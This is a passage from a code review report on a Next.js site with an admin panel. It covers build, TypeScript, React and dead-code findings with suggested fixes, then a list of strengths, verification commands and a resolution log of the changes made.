including everything under `process.cwd()` in the standalone bundle. That inflates the deploy
artefact (`.next/standalone` duplicating `public/`, `src/`, and — in a checkout with media — the
`.mp4` files) and can trip hosting size limits.

**Fix** — resolve the path statically at the call site:

```ts
const FILES = {
  content:   () => path.join(DATA_DIR, "site-content.json"),
  enquiries: () => path.join(DATA_DIR, "enquiries.json"),
  ...
};
```

or, minimally, follow Turbopack's own suggestion:

```ts
const raw = await fs.readFile(/* turbopackIgnore: true */ FILES[key], "utf8");
```

### 5.3 🟡 Medium — `examples/websocket` breaks `tsc`

```
examples/websocket/frontend.tsx(4,20): error TS2307: Cannot find module 'socket.io-client'
examples/websocket/server.ts(2,24):    error TS2307: Cannot find module 'socket.io'
```

`tsconfig.json` includes `**/*.ts, **/*.tsx`, so the example is type-checked in CI even though
nothing imports it. The `Caddyfile` comment in `server.ts` ("DO NOT change the path, it is used by
Caddy") suggests it was scaffold copy-paste.

**Fix** — delete `examples/`, or add `"exclude": ["node_modules", "examples"]` to `tsconfig.json`.

### 5.4 🟢 Low — 36 MB of video tracked despite a `*.mp4` ignore rule

`.gitignore` contains `*.mp4`, but `1.mp4`, `2.mp4`, `3.mp4`, `4.mp4` and `5.mp4` are **committed**
(18 MB + 15 MB + 12 MB + 364 KB + 248 KB ≈ 46 MB of blobs, `.git` is 43 MB). The rule was added after
they were tracked, and gitignore does not untrack already-committed files.

None of the five files is referenced anywhere in `src/` — the asset audit found 12 static references
and all 12 resolve to `public/`.

**Fix**

```bash
git rm --cached 1.mp4 2.mp4 3.mp4 4.mp4 5.mp4
git commit -m "chore: untrack video files (gitignored)"
```

The blobs stay in history — for a real reduction you need `git filter-repo` or a fresh history, which
may not be worth it. At minimum stop it growing.

### 5.5 🟢 Low — Fonts fetched from Google at build time

`src/app/layout.tsx:15-16` uses `next/font/google`. The comment says *"Fonts are self-hosted and
preloaded by next/font — no render-blocking request to Google"*, which is true for the **runtime** —
but the files are still downloaded from `fonts.googleapis.com` **at build time**. In this sandbox
(no route to Google) the build fails outright:

```
Error: next/font: error: Failed to fetch JetBrains Mono from Google Fonts.
Error: next/font: error: Failed to fetch Plus Jakarta Sans from Google Fonts.
→ Build error occurred
```

Any CI runner, air-gapped build box or corporate proxy without that route hits the same wall.

**Fix** — vendor the two families into `src/app/fonts/` and use `next/font/local`:

```ts
import LocalFont from "next/font/local";
const jakarta = LocalFont({ src: "./fonts/PlusJakartaSans.woff2", variable: "--font-jakarta-face", display: "swap" });
```

That also removes a build-time third-party dependency.

### 5.6 🟢 Low — `db/schema.sql` is out of sync with the runtime schema

`src/lib/content/mysql-store.ts:102-107` creates a `media` table (`id`, `mime`, `data MEDIUMBLOB`,
`created_at`). `db/schema.sql` documents `admins`, `audit_log`, `enquiries`, `site_content` — and
**not** `media`. Anyone provisioning from the SQL file gets a schema that silently differs from what
the app creates on first use.

`db/schema.sql` also pins `COLLATE=utf8mb4_0900_ai_ci` (MySQL 8.0 only), while the code's `CREATE
TABLE` has no explicit collation. Two sources of truth, drifting.

**Fix** — generate `schema.sql` from the same `SCHEMA` array (a tiny script that joins and prints it),
or drop the file and document that the app self-migrates.

---

## 6. React / front-end

Genuinely strong here: **20 `addEventListener` calls, 20 `removeEventListener` calls**; every
`setInterval` except one is cleared; no inline components; no `var`; no loose equality; no `innerHTML`.

### 6.1 🟢 Low — Three `setState` calls synchronously inside an effect

```
src/components/site/cosmic-popup.tsx:69   setDismissed(true)
src/components/site/cosmic-popup.tsx:85   setStarBurst(stars)
src/components/site/cosmic-reveal.tsx:57  setSparkles(s)
```

`react-hooks/set-state-in-effect` reports these as errors (they are the only 3 eslint errors in the
repo). They cause a cascading render on mount. `site-shell.tsx:69` and `carousel.tsx:103` suppress
the same rule with `eslint-disable-next-line` — so the codebase already has two answers for one
problem.

**Fix** — initialise from the external source in the `useState` initialiser instead of in an effect:

```ts
const [dismissed, setDismissed] = useState(
  () => sessionStorage.getItem(STORAGE_KEY) === "true"
);
```

For the random particle arrays, `useState(() => makeStars())` gives the same result with one render.
Note this moves `sessionStorage` access into the render path — safe here because the component is
client-only and mounted after hydration, but guard it if the component is ever server-rendered.

### 6.2 🟢 Low — `TextScramble` interval is never cleaned up

`src/components/site/premium-effects.tsx:268-308`

```ts
const scramble = () => {
  const interval = setInterval(() => { ... }, duration / maxIterations);
  // `interval` is a local — nothing can cancel it
};
...
onMouseEnter={showOnHover ? scramble : undefined}
```

- Unmounting mid-animation leaves the interval calling `setDisplayText` forever.
- Rapid hovering starts **concurrent** intervals racing to write the same state.
- The mount effect (`line 300`) depends only on `[text]` but closes over `delay`, and `scramble` is
  redefined every render — a stale-closure / exhaustive-deps violation.

**Fix** — hold the handle in a ref, clear on unmount and at the start of each run:

```ts
const timer = React.useRef<ReturnType<typeof setInterval> | null>(null);
React.useEffect(() => () => { if (timer.current) clearInterval(timer.current); }, []);
const scramble = React.useCallback(() => {
  if (timer.current) clearInterval(timer.current);
  ...
}, [text, duration]);
```

### 6.3 🟢 Low — Template leftovers

- `src/app/api/route.ts` — `GET` returns `{ message: "Hello, world!" }` at `/api`. Not referenced
  anywhere; it is a public, indexable endpoint that serves meaningless JSON.
- `package.json:2-3` — `"name": "nextjs_tailwind_shadcn_ts"`, `"version": "0.2.1"`. The scaffold name
  leaks into logs and error reports.
- `src/components/ui/*` (63 files) is unmodified shadcn/ui — correct to keep (it is vendored by
  design), but worth a `README` note so reviewers know it is generated and not hand-maintained.

**Fix** — delete `/api/route.ts`, rename the package.

### 6.4 🟡 Medium — 5,085 lines of unreferenced effect components

This is the single largest opportunity in the codebase. Seventeen files under
`src/components/site/` export components that **nothing imports** — verified twice, once by module
path and once by exported symbol:

| File | Lines | Exports | Referenced |
|---|---:|---:|---|
| `svg-animations.tsx` | 844 | 6 | ❌ |
| `advanced-effects.tsx` | 542 | 6 | ❌ |
| `premium-effects.tsx` | 509 | 6 | ❌ |
| `scroll-animations.tsx` | 503 | 6 | ❌ |
| `space-background.tsx` | 353 | 1 | ❌ |
| `animated-gradients.tsx` | 290 | 3 | ❌ |
| `cosmic-effects.tsx` | 288 | 4 | ❌ |
| `three-globe.tsx` | 243 | 1 | ❌ |
| `nebula-orb.tsx` | 217 | 3 | ❌ |
| `cosmic-reveal.tsx` | 207 | 2 | ❌ |
| `animated-beam.tsx` | 180 | 2 | ❌ |
| `liquid-glass.tsx` | 164 | 2 | ❌ |
| `border-beam.tsx` | 162 | 2 | ❌ |
| `aurora-background.tsx` | 157 | 2 | ❌ |
| `grid-patterns.tsx` | 148 | 2 | ❌ |
| `spotlight-card.tsx` | 148 | 2 | ❌ |
| `number-ticker.tsx` | 130 | 2 | ❌ |
| **Total** | **5,085** | **54** | — |

That is **19% of `src/`** (26,762 lines). For contrast, the whole admin panel is smaller.

Two of them have been duplicated before being abandoned:

- `LiquidGlass` is defined in **both** `advanced-effects.tsx:18` and `liquid-glass.tsx` — and used
  nowhere.
- `SpotlightCard` is defined in **both** `premium-effects.tsx:439` and `spotlight-card.tsx` — and used
  nowhere.

What the live site actually uses is far narrower: `svg-decor` (6 importers), `whatsapp-icon` (9),
`fx` (4), `ai-decor` (4), `word-reveal` (3), `cosmic-popup` (1), `ai-fx` (1).

This matters beyond tidiness:

- **It hides the real signal.** 2 of the 3 eslint errors (§6.1) and the `TextScramble` leak (§6.2)
  are in `cosmic-reveal.tsx` and `premium-effects.tsx` — files that never ship. Delete them and the
  lint run goes green, which makes the next genuine error visible.
- **It attracts maintenance.** Someone will eventually "fix" behaviour in a component that is not on
  any page.
- **`three-globe.tsx` (243 lines) imports `three`** (~600 KB gzipped). It is dead, so nothing is paid
  today — but it is one careless import away from the main bundle.
- **Bundle sizing is impossible to reason about** while 54 exported components have no call sites.

**Fix**

```bash
git rm src/components/site/{svg-animations,advanced-effects,premium-effects,scroll-animations,space-background,animated-gradients,cosmic-effects,three-globe,nebula-orb,cosmic-reveal,animated-beam,liquid-glass,border-beam,aurora-background,grid-patterns,spotlight-card,number-ticker}.tsx
npx tsc --noEmit && npx eslint .   # should now be clean once §5.3 and §6.1 are done
```

If some of these are deliberate "keep for a future redesign", move them to a `design-lab/` folder that
is excluded from `tsconfig.json` and from the linter, so they cannot be mistaken for live code.

---

## What is done well

Worth saying explicitly, because these are the things that usually go wrong and did not:

- **OTP implementation is textbook.** `crypto.randomInt` for the code, HMAC-with-server-secret stored
  instead of the code, `timingSafeEqual` on both the OTP and the session signature, single-use
  challenges, per-challenge attempt cap, resend cooldown, `httpOnly` + `SameSite=Strict` challenge
  cookie scoped to `/api/admin/login`. No notes.
- **`scryptSync` with a per-user 16-byte salt**, stored as `scrypt:salt:hash`, compared in constant
  time. Correct parameter choice for a Node server.
- **Password never in the URL.** `login-form.tsx:182` documents the reason for `action={undefined}` —
  someone thought about the no-JS submit path.
- **Upload validation is done right.** `api/admin/media/route.ts` sniffs magic bytes rather than
  trusting `Content-Type`, caps at 4 MB, and serves with `X-Content-Type-Options: nosniff` +
  `immutable` caching (safe because uploads are immutable by id). `media/[id]/route.ts` validates the
  UUID shape before touching the store, so there is no path traversal.
- **Email templating escapes properly.** `esc()` is applied to all **34** user-controlled
  interpolations in `templates.ts`, including the belt-and-braces `esc()` inside `detailRows` whose
  caller also escapes. `nl2br` composes on top of `esc`. No HTML injection into inboxes.
- **SQL is fully parameterised.** Every `conn.query` in `mysql-store.ts` uses `?` placeholders; no
  string concatenation, no `LIMIT` splicing, and `LIMIT ?` is passed as a bound number. The
  `DELETE ... WHERE id NOT IN (?)` array binding is valid under `query()` (mysql2 expands it).
- **Comment quality is above average.** `store.ts:117-131` explains *why* the cache lives on
  `globalThis`; `layout.tsx:102-108` explains the animation fail-safe; `otp.ts:1-18` states the
  invariants. This is the kind of comment that survives a rewrite.
- **Graceful degradation is designed, not accidental** — WebGL absence, `prefers-reduced-motion`,
  JS-disabled `noscript` styles, bot detection for the entrance door, `data-motion="off"` when
  `requestAnimationFrame` stalls. Rare to see this breadth.
- **`seo.ts` builds JSON-LD only from content that is actually visible on the page**, matching
  Google's requirement. `manifest.ts`, `robots.ts`, `sitemap.ts`, `llms.txt` and
  `opengraph-image.tsx` are all present and content-driven — better SEO surface than most production
  sites of this size.

---

## Recommended order of work

**Before the next deploy (all are small, surgical changes)**

1. §1.1 — fail closed on a missing `ADMIN_SESSION_SECRET`; rotate if ever deployed without it.
2. §1.2 — require `ADMIN_EMAIL`/`ADMIN_PASSWORD` in production; delete the public default password.
3. §1.3 — make the OTP console fallback dev-only and return `502` in production.
4. §3.1 — add `serializeJsonLd()` and use it at both `dangerouslySetInnerHTML` sites.
5. §3.2 — regex-validate `gaMeasurementId` / `clarityId` at the schema boundary.
6. §2.1 — move `backend` and `reachable` onto `globalThis` alongside the content cache.

**Next sprint (correctness under concurrency)**

7. §2.2 — replace list-replacement with targeted `INSERT`/`UPDATE`/`DELETE` statements.
8. §2.3 — `INSERT IGNORE` for admin seeding.
9. §2.4 / §2.5 — optimistic concurrency on `site_content` + generation-stamped cache writes.
10. §2.6 / §2.7 — stop swallowing JSON parse errors; move reads inside the write queue.
11. §1.4 — add `sessionVersion` to `AdminAccount` and invalidate on password change.

**Housekeeping (do it once, it stays done)**

12. §6.4 — delete the 17 unused effect components (5,085 lines); this also removes the two files
    behind most of the lint errors.
13. §5.1 / §5.3 — delete `examples/websocket/`, then turn on `ignoreBuildErrors: false` and
    `reactStrictMode: true`. This flips both `tsc` and `eslint` green.
14. §6.1 / §6.2 — fix the remaining eslint errors and the `TextScramble` interval.
15. §5.2 — statically scope the JSON store paths.
16. §5.4 / §5.6 / §6.3 — untrack the videos, sync `schema.sql`, delete `/api/route.ts`.
17. §3.3 / §3.4 / §4.1 / §4.2 / §4.3 — CSV formula escaping, Caddy port allowlist,
    schema-driven item sanitisation, dead condition, UI role gating.

**Larger, plan separately**

- §1.5 — a shared rate-limit service once there is more than one app instance.
- §5.5 — vendor the fonts and switch to `next/font/local` for reproducible builds.

---

## Verification commands

Reproduce every automated claim in this document:

```bash
npm install
npx tsc --noEmit          # 2 errors: examples/websocket/* (socket.io)
npx eslint .              # 3 errors + 1 warning
npx next build            # fails on fonts in an offline sandbox; 1 tracing warning (json-store.ts:71)

# review set + rules, via alibaba/open-code-review
ocr scan --preview --format json
ocr delegate rule --format json $(cat <reviewable files>)
```

---

*Review produced with [alibaba/open-code-review](https://github.com/alibaba/open-code-review) v1.13.3
in delegation mode. Every finding above is anchored to a file and line in commit `e4e5200`; the static
check results are reproducible with the commands in the last section.*

---

## Appendix — Resolution log

Every finding above has been fixed on this branch. Verified with `npx tsc --noEmit`
(0 errors), `npx eslint .` (0 problems), `npx next build` (0 warnings) and a live
smoke test of the production build plus the full two-step admin login.

| # | Fix | Where |
|---|---|---|
| 1.1 | Secret resolved lazily and **throws in production** when unset; dev falls back with a warning. Verified: a cookie forged with the old published value gets `401`. | `lib/admin/auth.ts` |
| 1.2 | Production requires `ADMIN_EMAIL`/`ADMIN_PASSWORD`; no default account is created without them. | `lib/admin/auth.ts` |
| 1.3 | `otpDeliveryMethod()` returns `"unavailable"` in production without SMTP; login answers `503` instead of issuing an undeliverable challenge. Verified live. | `lib/mail/otp-email.ts`, `api/admin/login/route.ts` |
| 1.4 | `sessionVersion` on `AdminAccount`, embedded in the token and re-checked per request. Bumped on password change and on deactivation; the caller who changes their own password gets a fresh cookie. Verified live (`ver 0 → 1`, old cookie `401`, new cookie `200`). | `types.ts`, `admin/auth.ts`, `api/admin/admins/[id]/route.ts` |
| 1.5 | One shared limiter (`lib/rate-limit.ts`) for login + contact, counting on `globalThis`. `clientIp()` now takes the **rightmost** XFF hop; `TRUST_PROXY_HEADERS=false` disables header trust. Contact responses include `Retry-After`. | `lib/rate-limit.ts`, `lib/admin/login-guard.ts`, `api/contact/route.ts` |
| 2.1 | `backend` + probe moved onto `globalThis` beside the cache; only a positive probe is cached, so a recovered database is picked up again. | `lib/content/store.ts` |
| 2.2 | `saveAdmins(list)` deleted. Per-row `createAdmin` / `updateAdmin(id, patch)` / `deleteAdmin(id)`; `recordLogin` is a single `UPDATE`. Duplicate email → `409` via `ON DUPLICATE KEY`. Verified live. | `mysql-store.ts`, `json-store.ts`, `store.ts`, admin routes |
| 2.3 | Seeding is insert-if-absent, so a lost race is harmless instead of deleting the winner's account. | `auth.ts` + `createAdmin` |
| 2.4 | JSON `updateContent` mutates inside the per-file queue. MySQL keeps its transaction; `version` is now the documented hook for optimistic concurrency. | `json-store.ts` |
| 2.5 | Generation counter: a read that began before a write no longer repopulates the cache. | `store.ts` |
| 2.6 | `ENOENT` → fallback; corrupt/unreadable → logged and thrown, never overwritten. Verified live (corrupt file → `500`, file untouched, recovery → `200`). | `json-store.ts` |
| 2.7 | Enquiries and audit log go through `mutateJson` (read inside the queue); `getEnquiries` copies before sorting. | `json-store.ts` |
| 3.1 | `serializeJsonLd()` escapes `< > & U+2028 U+2029`; used by both JSON-LD sites. | `lib/seo.ts`, `site-page.tsx`, `legal-page.tsx` |
| 3.2 | `safeMeasurementId()` / `safeClarityId()` allow-lists at render, plus `pattern` validation in the admin form so bad IDs are rejected at entry. | `lib/seo.ts`, `layout.tsx`, `schema-form.tsx`, `admin/seo/page.tsx` |
| 3.3 | `csvCell()` prefixes `'` on `= + - @ TAB CR`; CRLF line endings; anchor appended before click, object URL revoked on the next tick. | `admin/enquiry-table.tsx` |
| 3.4 | `Caddyfile` no longer proxies to `{query.XTransformPort}` — explicit port blocks only. | `Caddyfile` |
| 4.1 | Structural sanitiser keeps nested objects/arrays up to depth 4 instead of dropping them. Verified live (nested object round-trips). | `api/admin/content/route.ts` |
| 4.2 | Unreachable condition replaced by a comment stating the real policy. | `api/admin/enquiries/route.ts` |
| 4.3 | `AdminRoleProvider` + `canWrite`/`isOwner` in a client-safe `lib/admin/permissions.ts`; nav, collection editor and schema form hide/disable what a viewer cannot do. | `role-context.tsx`, `admin-shell.tsx`, `collection-editor.tsx`, `schema-form.tsx` |
| 4.4 | 500s carry a short reference id that also appears in the server log. | `api/admin/content/route.ts` |
| 5.1 | `ignoreBuildErrors: false`, `reactStrictMode: true`. | `next.config.ts` |
| 5.2 | `turbopackIgnore` markers on the JSON/media fs calls — build warning gone. | `json-store.ts` |
| 5.3 | `examples/websocket/` deleted; `tsc` has no errors left to ignore. | deleted |
| 5.4 | The five `.mp4` files are untracked (still on disk, still gitignored). | `git rm --cached` |
| 5.5 | `@fontsource-variable/*` self-hosted fonts replace `next/font/google` — the build no longer needs network access. | `package.json`, `layout.tsx`, `globals.css` |
| 5.6 | `db/schema.sql` regenerated from the runtime `SCHEMA`, `media` included, migration note appended. | `db/schema.sql` |
| 6.1 | `setDismissed`/`setStarBurst` moved out of effects into state initialisers and event handlers. | `cosmic-popup.tsx` |
| 6.2 | Fixed by deleting `premium-effects.tsx` (unreferenced). | deleted |
| 6.3 | `/api/route.ts` deleted; package renamed `yantrix-technology`. | deleted, `package.json` |
| 6.4 | 17 unreferenced effect components deleted (5,085 lines) — this is what took `eslint` to zero. | deleted |

New files introduced by the fixes:

- `src/lib/rate-limit.ts` — shared limiter + IP resolution
- `src/lib/admin/permissions.ts` — role rules usable from client and server
- `src/components/admin/role-context.tsx` — role available to the panel UI

Behaviour changes worth knowing before deploying:

1. `ADMIN_SESSION_SECRET` and SMTP are now **required in production**. Both fail
   closed rather than degrading.
2. The first admin must be bootstrapped with `ADMIN_EMAIL` / `ADMIN_PASSWORD`.
3. Changing a password (or deactivating an account) signs that account out of
   every other browser.
4. `.gitignore`'s `*.mp4` rule now actually applies to the five video files.
5. `git rm --cached` removed the videos from the working tree's index only; the
   blobs remain in history. A history rewrite is the only way to shrink `.git`.
